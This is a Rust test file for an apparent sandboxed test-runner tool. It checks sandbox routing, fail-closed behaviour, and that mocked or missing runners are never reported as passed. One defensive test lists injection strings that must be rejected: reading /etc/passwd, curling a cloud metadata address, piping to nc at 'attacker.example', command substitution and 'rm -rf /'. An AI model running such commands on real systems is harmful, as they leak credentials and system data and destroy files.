use async_trait::async_trait;
use factory_mcp_server::protocol::McpContent;
use factory_mcp_server::sandbox::{ExecutionResult, SandboxDriver, SubprocessDriver};
use factory_mcp_server::tools::run_tests::RunTestsTool;
use factory_mcp_server::tools::Tool;
use serde_json::{json, Value};
use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc, Mutex,
};

struct RecordingSandboxDriver {
    calls: Arc<Mutex<Vec<(String, String)>>>,
    call_count: Arc<AtomicUsize>,
    fail_with_error: Option<String>,
    simulated_exit_code: Option<i32>,
    simulated_stdout: String,
    simulated_stderr: String,
}

impl RecordingSandboxDriver {
    fn new_success(stdout: &str) -> Self {
        Self {
            calls: Arc::new(Mutex::new(Vec::new())),
            call_count: Arc::new(AtomicUsize::new(0)),
            fail_with_error: None,
            simulated_exit_code: Some(0),
            simulated_stdout: stdout.to_string(),
            simulated_stderr: String::new(),
        }
    }

    fn new_unavailable(err_msg: &str) -> Self {
        Self {
            calls: Arc::new(Mutex::new(Vec::new())),
            call_count: Arc::new(AtomicUsize::new(0)),
            fail_with_error: Some(err_msg.to_string()),
            simulated_exit_code: None,
            simulated_stdout: String::new(),
            simulated_stderr: String::new(),
        }
    }
}

#[async_trait]
impl SandboxDriver for RecordingSandboxDriver {
    async fn execute(&self, code: &str, language: &str) -> anyhow::Result<ExecutionResult> {
        self.call_count.fetch_add(1, Ordering::SeqCst);
        self.calls
            .lock()
            .unwrap()
            .push((code.to_string(), language.to_string()));

        if let Some(err) = &self.fail_with_error {
            anyhow::bail!("{}", err);
        }

        let code_exit = self.simulated_exit_code.unwrap_or(0);
        Ok(ExecutionResult {
            stdout: self.simulated_stdout.clone(),
            stderr: self.simulated_stderr.clone(),
            exit_code: Some(code_exit),
            is_success: code_exit == 0,
            attestation: None,
        })
    }
}

fn parse_report(res: &factory_mcp_server::protocol::CallToolResult) -> Value {
    let text = match &res.content[0] {
        McpContent::Text { text } => text,
        _ => panic!("Expected text content"),
    };
    serde_json::from_str(text).expect("Expected JSON TestExecutionReport")
}

#[tokio::test]
async fn test_run_tests_routes_through_injected_sandbox_driver_no_host_bypass() {
    let driver = Arc::new(RecordingSandboxDriver::new_success(
        "test result: ok. 5 passed",
    ));
    let call_count = driver.call_count.clone();
    let tool = RunTestsTool::new(driver);

    let res = tool
        .call(json!({
            "test_command": "cargo test --workspace",
            "language": "rust"
        }))
        .await
        .unwrap();

    let parsed = parse_report(&res);
    assert_eq!(
        call_count.load(Ordering::SeqCst),
        1,
        "RunTestsTool MUST invoke the injected SandboxDriver rather than bypassing to host sh -c"
    );
    assert!(!res.is_error);
    assert_eq!(parsed["outcome"], "passed");
    assert_eq!(parsed["status"], "success");
    assert_eq!(parsed["exit_code"], 0);
}

#[tokio::test]
async fn test_run_tests_fails_closed_when_sandbox_driver_unavailable() {
    let driver = Arc::new(RecordingSandboxDriver::new_unavailable(
        "Host subprocess execution is forbidden in production mode",
    ));
    let tool = RunTestsTool::new(driver);

    let res = tool
        .call(json!({
            "test_command": "pytest -q",
            "language": "python"
        }))
        .await
        .unwrap();

    let parsed = parse_report(&res);
    assert!(
        res.is_error,
        "Unavailable sandbox driver must fail closed as an error"
    );
    assert_ne!(parsed["status"], "success");
    assert_eq!(parsed["outcome"], "infrastructure_error");
}

#[tokio::test]
async fn test_run_tests_rejects_shell_metacharacters_and_invalid_arguments() {
    let driver = Arc::new(RecordingSandboxDriver::new_success("should not run"));
    let call_count = driver.call_count.clone();
    let tool = RunTestsTool::new(driver);

    for malicious_cmd in [
        "cargo test; cat /etc/passwd",
        "pytest && curl http://169.254.169.254",
        "cargo test | nc attacker.example 4444",
        "pytest $(whoami)",
        "cargo test `id`",
        "rm -rf /",
    ] {
        let res = tool
            .call(json!({
                "test_command": malicious_cmd,
                "language": "rust"
            }))
            .await
            .unwrap();

        let parsed = parse_report(&res);
        assert!(
            res.is_error,
            "Command '{}' must be rejected as error",
            malicious_cmd
        );
        assert_eq!(
            parsed["outcome"], "not_executed",
            "Command '{}' must report outcome: not_executed",
            malicious_cmd
        );
        assert_ne!(parsed["status"], "success");
        assert_eq!(
            call_count.load(Ordering::SeqCst),
            0,
            "Rejected command '{}' must never reach the sandbox driver",
            malicious_cmd
        );
    }
}

#[tokio::test]
async fn test_run_tests_rejects_unsupported_runtime_language() {
    let driver = Arc::new(RecordingSandboxDriver::new_success("should not run"));
    let call_count = driver.call_count.clone();
    let tool = RunTestsTool::new(driver);

    let res = tool
        .call(json!({
            "test_command": "pytest",
            "language": "cobol"
        }))
        .await
        .unwrap();

    let parsed = parse_report(&res);
    assert!(res.is_error, "Unsupported language must be rejected");
    assert_eq!(parsed["outcome"], "not_executed");
    assert_ne!(parsed["status"], "success");
    assert_eq!(call_count.load(Ordering::SeqCst), 0);
}

#[tokio::test]
async fn test_run_tests_mock_command_is_classified_as_mocked_not_passed() {
    let driver = Arc::new(RecordingSandboxDriver::new_success("should not run"));
    let tool = RunTestsTool::new(driver);

    let res = tool
        .call(json!({
            "test_command": "mock test suite"
        }))
        .await
        .unwrap();

    let parsed = parse_report(&res);
    assert_eq!(
        parsed["outcome"], "mocked",
        "Mocked command must return outcome: mocked, NEVER passed"
    );
    assert_eq!(
        parsed["status"], "mocked",
        "Mocked command must return status: mocked, NEVER success"
    );
    assert_eq!(parsed["execution_environment"], "mock");
}

#[tokio::test]
async fn test_run_tests_rejects_missing_runner_without_simulated_pass() {
    let tool = RunTestsTool::new(Arc::new(
        SubprocessDriver::new().with_force_production(false),
    ));

    let res = tool
        .call(json!({
            "test_command": "non_existent_binary_xyz_12345 --all"
        }))
        .await
        .unwrap();

    let parsed = parse_report(&res);

    assert!(
        res.is_error,
        "Tool call must be marked as error when test runner is missing or unapproved"
    );
    assert_ne!(
        parsed.get("status").and_then(|s| s.as_str()),
        Some("success"),
        "Missing runner must NEVER return status: success"
    );
    assert_ne!(
        parsed.get("exit_code").and_then(|c| c.as_i64()),
        Some(0),
        "Missing runner must NEVER return exit_code: 0"
    );
    let outcome = parsed.get("outcome").and_then(|o| o.as_str()).unwrap_or("");
    assert!(
        outcome == "not_executed" || outcome == "infrastructure_error",
        "Outcome must be explicitly not_executed or infrastructure_error, got: {}",
        outcome
    );
}
